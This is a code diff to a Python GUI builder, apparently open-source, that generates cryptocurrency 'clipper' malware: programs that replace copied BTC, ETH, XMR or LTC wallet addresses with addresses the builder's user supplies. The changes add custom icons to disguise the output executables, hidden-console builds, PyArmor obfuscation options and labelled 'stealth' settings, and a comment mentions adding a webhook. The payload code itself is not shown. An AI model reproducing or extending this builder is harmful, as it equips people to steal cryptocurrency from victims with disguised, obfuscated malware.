@@ -1,4 +1,5 @@
 from CTkMessagebox import CTkMessagebox
+from PIL import Image
 
 import customtkinter
 import subprocess
@@ -7,10 +8,12 @@ import CTkToolTip
 import shutil
 import time
 import hPyT
+import sys
 import re
 import os
 
 #needs pyarmor for obfuscator - pyarmor gen main.py
+#needs webhook within methdods
 
 btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
 eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
@@ -23,9 +26,16 @@ cwd = os.getcwd()
 
 class resetconfig:
     def reset(btc_addr, eth_addr, xmr_addr, ltc_addr):
+        global icon_path
+
+        icon_path = ""
+
+        add_icon_btn.configure(text="add custom icon", command=lambda: buildgui.icon_add())
+        icon_temp_label.configure(image="", text="icon will appear here")
+        
         set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
         config_set_lbl.configure(text="config not set", text_color="red")
-        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
+        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr), state="normal")
         exe_file_checkbox.deselect()
         obfuscate_checkbox.deselect()
         single_use_checkbox.deselect()
@@ -34,10 +44,18 @@ class resetconfig:
 
 class build:
     def exe(current_path, new_file_name):
-        start = time.time()
-        subprocess.run(["pyinstaller", "--onefile", f"{current_path}", "--distpath", "output/dist_non_obfuscated"])
-        end = time.time()
-        final_time = round(end - start)
+        print(icon_path)
+        if icon_path == "":
+            start = time.time()
+            subprocess.run(["pyinstaller", "--onefile", f"{current_path}", "--distpath", "output/dist_non_obfuscated"])
+            end = time.time()
+            final_time = round(end - start)
+        else:
+            start = time.time()
+            subprocess.run(["pyinstaller", "-w", "--onefile", "--icon", icon_path, current_path, "--distpath", "output/dist_non_obfuscated"])
+            end = time.time()
+            final_time = round(end - start)
+
         if os.path.exists("output\\dist_non_obfuscated"):
             shutil.rmtree("build")
             rm_file_path = str(new_file_name).replace(".pyw", ".spec")
@@ -45,19 +63,27 @@ class build:
             CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
 
     def obfuscate(current_path, new_file_name):
-        start = time.time()
-        subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
-        end = time.time()
-        final_time = round(end - start)
+        if icon_path == "":
+            start = time.time()
+            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w"'])
+            time.sleep(1)
+            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
+            end = time.time()
+            final_time = round(end - start)
+        else:
+            start = time.time()
+            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon {icon_path}"'])
+            time.sleep(1)
+            subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack", "onefile"])
+            end = time.time()
+            final_time = round(end - start)
+
         if os.path.exists("output\\dist_obfuscated"):
             shutil.rmtree(".pyarmor")
             shutil.rmtree("dist")
             rm_file_path = str(new_file_name).replace(".pyw", ".spec")
             os.remove(rm_file_path)
             CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
-
-    def build_all(single_use, obfuscate, exe_file):
-        print("build_all")
 
     def build_subprocess(single_use, obfuscate, exe_file):
         if single_use == "on":
@@ -246,9 +272,7 @@ class build:
             build.build_ctypes(single_use, obfuscate, exe_file)
         if type == "pyperclip (1 external module - no stealth)":
             build.build_pyperclip(single_use, obfuscate, exe_file)
-        if type == "create all with given settings":
-            build.build_all(single_use, obfuscate, exe_file)
-
+            
 class buildclipperconfig:
     class_called = 0
 
@@ -313,8 +337,24 @@ class buildgui:
                 except Exception as e:
                     CTkMessagebox(title="error", message=e, icon="cancel")
 
+    def icon_add():
+        global icon_path
+
+        icon_path = customtkinter.filedialog.askopenfilename(initialdir=f"{cwd}\\DefultIcons", title="select icon", filetypes=[("Icon Files", "*.ico")])
+
+        if icon_path == "":
+            pass
+        else:
+            icon_img = customtkinter.CTkImage(light_image=Image.open(icon_path),
+                                              dark_image=Image.open(icon_path),
+                                              size=(50, 50))
+            
+            icon_temp_label.configure(image=icon_img, text="")
+            
     def build_widgets():
-        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name
+        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name, icon_temp_label, add_icon_btn, icon_path
+
+        icon_path = ""
 
         for widget in option_frame.winfo_children():
             widget.destroy()
@@ -334,17 +374,16 @@ class buildgui:
         xmr_addr.pack(fill="x", padx=5, pady=0)
         out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .py extention (leave empty if for defult name): ")
         out_name.pack(fill="x", padx=5, pady=5)
-        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
+        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr), state="normal")
         check_valid_btn.pack(fill="x", padx=5, pady=0)
-        kill_reset_btn = customtkinter.CTkButton(master=main_frame, text="KILL AND RESET ALL FRAMES", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"))
-        kill_reset_btn.pack(fill="x", padx=5, pady=5)
+        exit = customtkinter.CTkButton(master=main_frame, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
+        exit.pack(fill="x", padx=5, pady=5)
         
         clipper_type = customtkinter.CTkComboBox(master=option_frame, state="readonly", 
                                                  values=["set clipper type", 
                                                          "subprocess (0 external modules - stealth)", 
                                                          "ctypes (0 external modules - stealth)", 
-                                                         "pyperclip (1 external module - no stealth)", 
-                                                         "create all with given settings"])
+                                                         "pyperclip (1 external module - no stealth)"])
         clipper_type.set("set clipper type")
         clipper_type.pack(fill="x", padx=10, pady=5)
         single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use - stealth 1/3", onvalue="on", offvalue="off")
@@ -353,8 +392,14 @@ class buildgui:
         obfuscate_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
         exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="normal .exe file - stealth 2/3", onvalue="on", offvalue="off")
         exe_file_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        add_icon_btn = customtkinter.CTkButton(master=option_frame, text="add custom icon", command=lambda: buildgui.icon_add())
+        add_icon_btn.pack(fill="x", padx=10, pady=5)
+
+        icon_temp_label = customtkinter.CTkLabel(master=option_frame, text="icon will appear here", wraplength=150)
+        icon_temp_label.pack(pady=(0, 5))
+
         set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
-        set_config_btn.pack(fill="x", padx=10, pady=5)
+        set_config_btn.pack(fill="x", padx=10, pady=0)
         config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
         config_set_lbl.pack()
 
@@ -386,7 +431,13 @@ class buildgui:
         main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
         main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(5, 0))
 
-        customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424").pack(fill="both", expand=True)
+        docs = customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424")
+        docs.pack(fill="both", expand=True)
+        customtkinter.CTkLabel(master=docs, text="""placeholder
+in the event your chosen icon doesnt bind to the .exe try restarting file explorer as for some unknown reason the icon binds but doesnt visually show it until restarting explorer                            
+if issue with icons delete icon cashe %localappdata%.
+                               """, justify="left").pack(anchor="w")
+
         customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))
 
         buildgui.build_widgets()
@@ -394,4 +445,12 @@ class buildgui:
         root.mainloop()
 
 if __name__ == "__main__":
+    if os.path.exists("output\\dist_obfuscated"):
+        pass
+    else:
+        os.mkdir("output\\dist_obfuscated")
+    if os.path.exists("output\\dist_non_obfuscated"):
+        pass
+    else:
+        os.mkdir("output\\dist_non_obfuscated")
     buildgui.main()
